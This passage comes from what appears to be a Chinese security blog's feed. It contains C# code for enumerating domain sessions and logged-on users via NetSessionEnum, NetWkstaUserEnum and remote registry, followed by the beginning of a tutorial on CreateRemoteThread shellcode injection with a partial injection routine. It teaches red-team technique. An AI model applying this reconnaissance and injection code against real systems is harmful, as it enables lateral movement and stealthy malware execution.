&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;本文针对第 3 点进行展开。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】域内会话收集</title>
    <link href="https://rcoil.me/2019/10/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9F%9F%E5%86%85%E4%BC%9A%E8%AF%9D%E6%94%B6%E9%9B%86/"/>
    <id>https://rcoil.me/2019/10/【域渗透】域内会话收集/</id>
    <published>2019-10-01T03:13:20.000Z</published>
    <updated>2019-11-01T01:48:22.943Z</updated>
    
    <content type="html"><![CDATA[<p>2018 年3月，<code>BooldHound</code> 发表了篇博文  <a href="https://blog.cptjesus.com/posts/sharphoundtargeting" target="_blank" rel="noopener">SharpHound: Target Selection and API Usage</a> 。这里面介绍了一些关于收集 <code>BooldHound</code> 所需信息的收集方法及所使用的 <code>API</code>。而本文主要介绍两个关于收集会话信息的 <code>API</code>及利用远程注册表的方法（翻译+补充），也是对<a href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/">【域渗透】获取域环境内用户登录信息</a> 的一个补充。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>使用过<code>BooldHound</code> 的朋友都知道，它所呈现出来非常多的信息，基本能满足日常信息收集所需的数据，但是之前使用的时候，就很惊讶，它们的会话关系数据来源是怎么来的，所幸后来官方给了解释。</p><h2 id="0x01-会话收集"><a href="#0x01-会话收集" class="headerlink" title="0x01 会话收集"></a>0x01 会话收集</h2><p><code>BooldHound</code> 公开了三种不同的查询计算机会话信息的方法，都是从检查 445 端口开始的。</p><h3 id="1）、NetSessionEnum"><a href="#1）、NetSessionEnum" class="headerlink" title="1）、NetSessionEnum"></a>1）、NetSessionEnum</h3><p>它不允许直接查询是谁登陆了此工作站，但是它允许查询是谁在访问此工作站的网络资源（例如文件共享）时所创建的网络会话，从而知道来自何处。当然这里最好的查询对象是域控 + 文件共享服务器。此函数不需要高权限。</p><p>该函数原型是：</p><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-19_12-34-12.png" alt=""></p><p>它需要 9 个参数，我们只需了解其中的 5 个参数即可：</p><ul><li><strong>servername：</strong>该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为<code>NULL</code>，则使用本地计算机。</li><li><strong>UncClientName：</strong>该字符串指定要为其返回信息的计算机会话的名称。如果此参数为 <code>NULL</code>，则 <code>NetSessionEnum</code> 将返回服务器上所有计算机会话的信息。</li><li><strong>username：</strong>该字符串指定要为其返回信息的用户的名称。如果此参数为 <code>NULL</code>，则 <code>NetSessionEnum</code> 将返回所有用户的信息。</li><li><strong>level：</strong>指定数据的信息级别。</li><li><strong>bufptr：</strong>指向接收数据的缓冲区的指针。此数据的格式取决于 <code>level</code> 参数的值。此缓冲区由系统分配，必须使用 <a href="https://docs.microsoft.com/windows/desktop/api/lmapibuf/nf-lmapibuf-netapibufferfree" target="_blank" rel="noopener">NetApiBufferFree</a> 函数释放 。请注意，即使函数因 <code>ERROR_MORE_DATA</code> 而失败，也必须释放缓冲区。</li></ul><p>而此 API 的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> server = <span class="string">"rcoil.me"</span></span><br><span class="line">nStatus = NetSessionEnum(server, <span class="literal">null</span>, <span class="literal">null</span>, <span class="number">10</span>, <span class="keyword">out</span> Bufptr, <span class="number">-1</span>, <span class="keyword">ref</span> dwEntriesread, <span class="keyword">ref</span> dwTotalentries, <span class="keyword">ref</span> dwResume_handle);</span><br></pre></td></tr></table></figure><p>其中，<code>level</code> 的数值为10，是唯一以未经身份验证的方式获取所需数据的级别。</p><p>它会返回如下内容：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sesi10_cname - <span class="number">192.10</span><span class="number">.22</span><span class="number">.102</span></span><br><span class="line">sesi10_username - RcoIl</span><br><span class="line">sesi10_time - <span class="number">0</span></span><br><span class="line">sesi10_idle_time - <span class="number">0</span></span><br></pre></td></tr></table></figure><p>关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 返回指定服务器的所有 SESSIONS。返回 SESSION_INFO_10 结构的数组。</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> https://www.pinvoke.net/default.aspx/netapi32/NetSessionEnum.html</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="server"&gt;</span>默认所有域内机器，隐形目标：域控制器+共享服务器<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>SESSION_INFO_10 STRUCTURE ARRAY<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SESSION_INFO_10[] <span class="title">EnumSessions</span>(<span class="params"><span class="keyword">string</span> server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  IntPtr Bufptr;</span><br><span class="line">  <span class="keyword">int</span> nStatus = <span class="number">0</span>;</span><br><span class="line">  Int32 dwEntriesread = <span class="number">0</span>, dwTotalentries = <span class="number">0</span>, dwResume_handle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  Bufptr = (IntPtr)Marshal.SizeOf(<span class="keyword">typeof</span>(SESSION_INFO_10));</span><br><span class="line">  SESSION_INFO_10[] results = <span class="keyword">new</span> SESSION_INFO_10[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    nStatus = NetSessionEnum(server, <span class="literal">null</span>, <span class="literal">null</span>, <span class="number">10</span>, <span class="keyword">out</span> Bufptr, <span class="number">-1</span>, <span class="keyword">ref</span> dwEntriesread, <span class="keyword">ref</span> dwTotalentries, <span class="keyword">ref</span> dwResume_handle);</span><br><span class="line">    results = <span class="keyword">new</span> SESSION_INFO_10[dwEntriesread];</span><br><span class="line">    <span class="keyword">if</span> (nStatus == (<span class="keyword">int</span>)NERR.ERROR_MORE_DATA || nStatus == (<span class="keyword">int</span>)NERR.NERR_Success)</span><br><span class="line">    &#123;</span><br><span class="line">      Int32 p = Bufptr.ToInt32();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwEntriesread; i++)</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        SESSION_INFO_10 si = (SESSION_INFO_10)Marshal.PtrToStructure(<span class="keyword">new</span> IntPtr(p), <span class="keyword">typeof</span>(SESSION_INFO_10));</span><br><span class="line">        results[i] = si;</span><br><span class="line">        p += Marshal.SizeOf(<span class="keyword">typeof</span>(SESSION_INFO_10));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//NetApiBufferFree(BufPtr);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 释放先前从进程的非托管内存分配的内存。</span></span><br><span class="line">    Marshal.FreeHGlobal(Bufptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (nStatus == (<span class="keyword">int</span>)NERR.ERROR_MORE_DATA);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2）、NetWkstaUserEnum"><a href="#2）、NetWkstaUserEnum" class="headerlink" title="2）、NetWkstaUserEnum"></a>2）、NetWkstaUserEnum</h3><p>该 <strong>NetWkstaUserEnum</strong> 功能可以列出当前登录到该工作站的所有用户的信息。此列表包括交互式、服务和批量登录。此函数需要主机的管理权限或这域管权限，适用于自检使用。</p><p>该函数原型是：</p><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-19_14-38-02.png" alt=""></p><p>它需要 7个参数，我们只需了解其中的 3 个参数即可：</p><ul><li><strong>servername：</strong>该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为<code>NULL</code>，则使用本地计算机。</li><li><strong>level：</strong>指定数据的信息级别。</li><li><strong>bufptr：</strong>指向接收数据的缓冲区的指针。此数据的格式取决于 <code>level</code> 参数的值。此缓冲区由系统分配，必须使用 <a href="https://docs.microsoft.com/windows/desktop/api/lmapibuf/nf-lmapibuf-netapibufferfree" target="_blank" rel="noopener">NetApiBufferFree</a> 函数释放 。请注意，即使函数因 <code>ERROR_MORE_DATA</code> 而失败，也必须释放缓冲区。</li></ul><p> 而此 API 的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> server = <span class="string">"rcoil.me"</span></span><br><span class="line">nStatus = NetWkstaUserEnum(server, <span class="number">1</span>, <span class="keyword">out</span> Bufptr, <span class="number">32768</span>, <span class="keyword">out</span> dwEntriesread, <span class="keyword">out</span> dwTotalentries, <span class="keyword">ref</span> dwResumehandle);</span><br></pre></td></tr></table></figure><p>其中，<code>level</code> 的数值为1，是因为 1 比 0 返回的数据多，因此选择了 1。</p><p>它会返回如下内容：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wkui1_username - Administrator</span><br><span class="line">wkui1_logon_domain - RDC_1</span><br><span class="line">wkui1_oth_domains -</span><br><span class="line">wkui1_logon_server - RCOIL</span><br></pre></td></tr></table></figure><p>关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> API 调用的第二个参数是 API 调用的级别，其中 1 返回的数据多于 0，所以选择 1进行测试</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> https://www.pinvoke.net/default.aspx/netapi32/netwkstauserenum.html</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="server"&gt;</span>默认所有域内机器，隐形目标：域控制器+共享服务器<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> WKSTA_USER_INFO_1[] <span class="title">EnumWkstaUser</span>(<span class="params"><span class="keyword">string</span> server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  IntPtr Bufptr;</span><br><span class="line">  <span class="keyword">int</span> nStatus = <span class="number">0</span>;</span><br><span class="line">  Int32 dwEntriesread = <span class="number">0</span>, dwTotalentries = <span class="number">0</span>, dwResumehandle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  Bufptr = (IntPtr)Marshal.SizeOf(<span class="keyword">typeof</span>(WKSTA_USER_INFO_1));</span><br><span class="line">  WKSTA_USER_INFO_1[] results = <span class="keyword">new</span> WKSTA_USER_INFO_1[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    nStatus = NetWkstaUserEnum(server, <span class="number">1</span>, <span class="keyword">out</span> Bufptr, <span class="number">32768</span>, <span class="keyword">out</span> dwEntriesread, <span class="keyword">out</span> dwTotalentries, <span class="keyword">ref</span> dwResumehandle);</span><br><span class="line">    results = <span class="keyword">new</span> WKSTA_USER_INFO_1[dwEntriesread];</span><br><span class="line">    <span class="keyword">if</span> ((nStatus == NERR_SUCCESS) || (nStatus == ERROR_MORE_DATA))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (dwEntriesread &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        IntPtr pstruct = Bufptr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwEntriesread; i++)</span><br><span class="line">        &#123;</span><br><span class="line">          WKSTA_USER_INFO_1 wui1 = (WKSTA_USER_INFO_1)Marshal.PtrToStructure(pstruct, <span class="keyword">typeof</span>(WKSTA_USER_INFO_1));</span><br><span class="line">          results[i] = wui1;</span><br><span class="line">          pstruct = (IntPtr)((<span class="keyword">int</span>)pstruct + Marshal.SizeOf(<span class="keyword">typeof</span>(WKSTA_USER_INFO_1)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Bufptr != IntPtr.Zero)</span><br><span class="line">      NetApiBufferFree(Bufptr);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">while</span> (nStatus == ERROR_MORE_DATA);</span><br><span class="line">  <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3）、远程注册表"><a href="#3）、远程注册表" class="headerlink" title="3）、远程注册表"></a>3）、远程注册表</h3><p>此方法仅为辅助启用。尝试打开远程注册表的用户配置单元（如果已启用），并将查找与 SID 格式匹配的子项，这些对应于登录用户将获取的 SID 转换成用户名即可。一般来说，需要域管权限去操作，而在极少数情况下，无需管理员权限即可访问此数据，这个得看脸。</p><p>此处使用 <code>OpenRemoteBaseKey()</code> 函数。    </p><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-20_11-44-13.png" alt=""></p><p>它需要 2 个参数：</p><ul><li><strong>RegistryHive：</strong>来自 <a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.win32.registryhive?view=netframework-4.8" target="_blank" rel="noopener">RegistryHive</a> 的枚举。这里选择 <code>Users</code>，表示 <code>HKEY_USERS</code>。</li><li><strong>string：</strong>表示远程主机。</li></ul><p>此函数的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> key = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, server);</span><br></pre></td></tr></table></figure><p>它会返回如下内容：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">HKEY_USERS</span></span><br></pre></td></tr></table></figure><p>然后读取 <code>HKEY_USERS</code> 的键项就可以了。关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 利用 OpenRemoteBaseKey 读取 HKEY_USERS 的键项</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="server"&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> IEnumerable&lt;<span class="keyword">string</span>&gt; <span class="title">GetRegistryLoggedOn</span>(<span class="params"><span class="keyword">string</span> server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> users = <span class="keyword">new</span> List&lt;<span class="keyword">string</span>&gt;();</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 远程打开注册表配置单元，如果它不是我们当前的配置单元</span></span><br><span class="line">    RegistryKey key = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, server);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到与我们的正则表达式匹配的所有子项</span></span><br><span class="line">    <span class="keyword">var</span> filtered = key.GetSubKeyNames().Where(sub =&gt; SidRegex.IsMatch(sub));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> subkey <span class="keyword">in</span> filtered)</span><br><span class="line">    &#123;</span><br><span class="line">      users.Add(subkey);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (Exception)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span> (<span class="keyword">var</span> user <span class="keyword">in</span> users.Distinct())</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> user;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后将 用户的SID 转成用户名即可。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> Username = <span class="keyword">new</span> SecurityIdentifier(regSID).Translate(<span class="keyword">typeof</span>(NTAccount)).ToString();</span><br></pre></td></tr></table></figure><h3 id="4）、结果"><a href="#4）、结果" class="headerlink" title="4）、结果"></a>4）、结果</h3><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-20_12-53-42.png" alt=""></p><h2 id="0x02-备忘录"><a href="#0x02-备忘录" class="headerlink" title="0x02 备忘录"></a>0x02 备忘录</h2><table><thead><tr><th style="text-align:left">API 调用</th><th style="text-align:center">协议</th><th style="text-align:center">端口</th><th style="text-align:left">RPC 接口 UUID</th><th style="text-align:left">命名管道</th><th style="text-align:left">RPC 方法</th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/bb525382(v=vs.85" target="_blank" rel="noopener">NetSessionEnum</a>.aspx)</td><td style="text-align:center">[MS-SRVS]: Server Service Remote Protocol</td><td style="text-align:center">TCP 445</td><td style="text-align:left">4B324FC8-1670-01D3-1278-5A47BF6EE188</td><td style="text-align:left">\PIPE\srvsvc</td><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/cc247273.aspx" target="_blank" rel="noopener">NetrSessionEnum</a></td></tr><tr><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa370669(v=vs.85" target="_blank" rel="noopener">NetWkstaUserEnum</a>.aspx)</td><td style="text-align:center">[MS-WKST]: Workstation Service Remote Protocol</td><td style="text-align:center">TCP 445</td><td style="text-align:left">6BFFD098-A112-3610-9833-46C3F87E345A</td><td style="text-align:left">\PIPE\wkssvc</td><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/cc250349.aspx" target="_blank" rel="noopener">NetrWkstaUserEnum</a></td></tr></tbody></table><p>Github 项目地址：<a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SharpDomainSession" target="_blank" rel="noopener">SharpDomainSession</a> ，此项目仅供实验使用 Demo。如想更进一步利用，可移至 <a href="https://github.com/BloodHoundAD/SharpHound" target="_blank" rel="noopener">SharpHound</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2018 年3月，&lt;code&gt;BooldHound&lt;/code&gt; 发表了篇博文  &lt;a href=&quot;https://blog.cptjesus.com/posts/sharphoundtargeting&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SharpHound: Target Selection and API Usage&lt;/a&gt; 。这里面介绍了一些关于收集 &lt;code&gt;BooldHound&lt;/code&gt; 所需信息的收集方法及所使用的 &lt;code&gt;API&lt;/code&gt;。而本文主要介绍两个关于收集会话信息的 &lt;code&gt;API&lt;/code&gt;及利用远程注册表的方法（翻译+补充），也是对&lt;a href=&quot;https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/&quot;&gt;【域渗透】获取域环境内用户登录信息&lt;/a&gt; 的一个补充。&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【知识回顾】进程注入-第一部分</title>
    <link href="https://rcoil.me/2019/09/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/"/>
    <id>https://rcoil.me/2019/09/【知识回顾】进程注入-第一部分/</id>
    <published>2019-09-01T06:37:56.000Z</published>
    <updated>2019-10-31T15:42:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>通过 <code>CreateRemoteThread</code> API 进行代码与 DLL 注入。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>某日看到收藏夹里头的 <a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" target="_blank" rel="noopener">Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques</a> ，里头总结得很到位，在国内的几个流行的安全媒体上也见过译文。</p><p>通过对进程注入技术的学习和理解，个人觉得整个过程非常有趣，故以此作为 C# 代码学习的方向（Windows API 利用），并编写有助于学习和开发的代码。</p><p><strong>注意： </strong>我不是第一个编写这样代码的人，Github 有一大堆代码示例。</p><h2 id="0x01-什么是进程注入"><a href="#0x01-什么是进程注入" class="headerlink" title="0x01 什么是进程注入"></a>0x01 什么是进程注入</h2><p>进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。尽管有非常多的进程注入技术，本文所述是最常用的进程注入技术之一。</p><h2 id="0x02-VirtualAllocEx-gt-WriteProcessMemory-模式"><a href="#0x02-VirtualAllocEx-gt-WriteProcessMemory-模式" class="headerlink" title="0x02 VirtualAllocEx =&gt; WriteProcessMemory 模式"></a>0x02 <strong>VirtualAllocEx</strong> =&gt; <strong>WriteProcessMemory</strong> 模式</h2><p><code>CreateRemoteThread</code> 是 Win32 API 提供的一个函数，用于在另一个进程中创建线程。在另一个应用程序中创建线程之前，必须满足两个条件。</p><ul><li><p>尝试在另一个进程中创建线程的进程必须具有创建线程的权限。简单来说，必须有与目标进程相同或更高的权限（目标指的是我们想要创建线程的进程）</p></li><li><p>两个进程必须在同一会话中。如果会话标识符不匹配，则不会创建线程。</p></li></ul><p>如果不满足上述任何一个条件，则操作系统本身将拒绝代码注入这一过程。这不是 Windows 操作系统体系结构中的安全漏洞，而是由操作系统提供的功能。由于我们无法修改具有比我们更高权限的进程，因此不会跨越任何安全边界。</p><p>为了通过 <code>CreateRemoteThread</code> API 实现代码注入，我们遵循以下流程：</p><p><img src="/image/【知识回顾】进程注入-第一部分/CreateRemoteThread 进程注入流程图.png" alt=""></p><p>代码示意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public static void CodeInject(int pid, byte[] buf)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        uint lpNumberOfBytesWritten = 0;</span><br><span class="line">        uint lpThreadId = 0;</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 获取进程ID &#123;pid&#125; 的句柄.&quot;);</span><br><span class="line">        IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 打开进程id &#123; pid &#125; 的句柄 &#123;pHandle&#125;.&quot;);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 分配内存以注入shellcode.&quot;);</span><br><span class="line">        IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] Shellcode 的内存分配在 0x&#123;rMemAddress&#125;.&quot;);</span><br><span class="line">        Console.WriteLine($&quot;  [&gt;] 在已分配的内存位置写入shellcode&quot;);</span><br><span class="line">        if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine($&quot;  [&gt;] Shellcode写在进程内存中.&quot;);</span><br><span class="line">            Console.WriteLine($&quot;  [&gt;] 创建远程线程来注入 shellcode.&quot;);</span><br><span class="line">            IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);</span><br><span class="line">            bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);</span><br><span class="line">            Console.WriteLine($&quot;  [&gt;] 成功将 shellcode 注入进程id &#123;pid&#125; 的内存中.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine($&quot;  [!] 